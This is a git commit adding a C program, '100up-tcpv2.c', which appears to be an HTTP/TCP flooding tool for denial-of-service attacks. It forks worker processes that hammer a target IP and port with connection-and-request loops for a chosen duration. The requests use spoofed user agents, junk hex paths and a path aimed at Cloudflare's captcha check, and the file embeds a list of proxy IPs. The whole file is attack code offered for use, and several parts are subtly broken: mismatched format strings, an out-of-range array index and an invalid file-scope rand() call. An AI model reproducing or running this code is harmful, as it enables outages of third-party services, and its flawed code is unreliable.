7f6c885045e0d744a8a128c9cc9583d6242e256f
Elheke <90067989+Elheke@users.noreply.github.com>
2021-09-04 06:27:35 +1000

    Create 100up-tcpv2.c

---
+++ 100up-tcpv2.c
@@ -0,0 +1,121 @@
+/*
+        100UP-TCP v2 By archs (big heke)
+		How to use:
+		apt install gcc
+		gcc -o 100up-proxy 100up-proxy.c -pthread
+*/
+#include <stdlib.h>
+#include <stdarg.h>
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <signal.h>
+#include <strings.h>
+#include <string.h>
+#include <sys/utsname.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/tcp.h>
+#include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+
+const char *useragents[] = {
+"Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01",
+"Mozilla/5.0 (Android; Tablet; rv:14.0) Gecko/14.0 Firefox/14.0",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
+"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
+"Mozilla/4.0 (compatible; MSIE 5.0; Windows 95) Opera 6.01  [en]",
+"Mozilla/4.0 (compatible; MSIE 5.0; Mac_PowerPC) Opera 5.0  [en]",
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
+"Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20111108 Firefox/8.0 PaleMoon/8.0",
+"Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:5.0) Gecko/20110624 Firefox/5.0-x64 PaleMoon/5.0-x64",
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101215 Firefox/3.6.13 (Palemoon/3.6.13)",
+"Mozilla/3.0 (compatible; HP Web PrintSmart 04b0 1.0.1.34)",
+"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv: 1.9.1a2pre) Gecko/20080813221937 Prism/0.9.1",
+"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071719 prism/0.8",
+};
+
+const char *proxies[] = {
+"203.76.124.35:8080","141.0.180.242:8080","183.88.78.15:8080","195.201.61.51:8000","103.53.76.84:8080","82.212.62.21:8080","182.72.150.242:8080","191.96.42.80:8080",
+};
+
+int socket_connect(char *host, in_port_t port) 
+{
+	struct hostent *hp;
+	struct sockaddr_in addr;
+	int on = 1, sock;     
+	if ((hp = gethostbyname(host)) == NULL) return 0;
+	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
+	addr.sin_port = htons(port);
+	addr.sin_family = AF_INET;
+	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
+	if (sock == -1) return 0;
+	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
+	return sock;
+}      
+
+
+char *hexa[] = {"\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff"};
+		char *getPayload = hexa[rand()%253];
+
+void SendHTTPHex(char *method, char *host, int port, int timeEnd, int power) {
+	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
+	char request[2048], buffer[1], hex_payload[4096];
+	sprintf(hex_payload, "%getPayload%getPayload\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01", 32);
+	for (i = 0; i < power; i++) {
+		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hex_payload, host, useragents[(rand() % 7)], proxies);
+		if (fork()) {
+			while (end > time(NULL)) {
+				socket = socket_connect(host, port);
+				if (socket != 0) {
+					write(socket, request, strlen(request));
+					read(socket, buffer, 1);
+					close(socket);
+				}
+			}
+			exit(0);
+		}
+	}
+}
+void sendHTTPtwo(char *method, char *host, int port, int timeEnd, int power) {
+	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
+	char request[2048], buffer[1], hex_3payload[4096];
+	sprintf(hex_3payload, "\0x");
+	for (i = 0; i < power; i++) {
+		sprintf(request, "%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hex_3payload, host, useragents[(rand() % 36)], proxies);
+		if (fork()) {
+			while (end > time(NULL)) {
+				socket = socket_connect(host, port);
+				if (socket != 0) {
+					write(socket, request, strlen(request));
+					read(socket, buffer, 1);
+					close(socket);
+				}
+			}
+			exit(0);
+		}
+	}
+}
+
+int main(int argc, char **argv)
+{
+    if(argc != 6)
+    {
+		printf("100UP-TCP V2 BY ARCHS | @ttl.hax \n");
+        printf("Invalid Params\nExample: %s GET IP DPORT TIME SOCKETS\n", argv[0]);
+        exit(0);
+    }
+    SendHTTPHex(argv[1], argv[2], atoi(argv[3]), atoi(argv[4]), atoi(argv[5]));
+    sendHTTPtwo(argv[1], argv[2], atoi(argv[3]), atoi(argv[4]), atoi(argv[5]));
+};
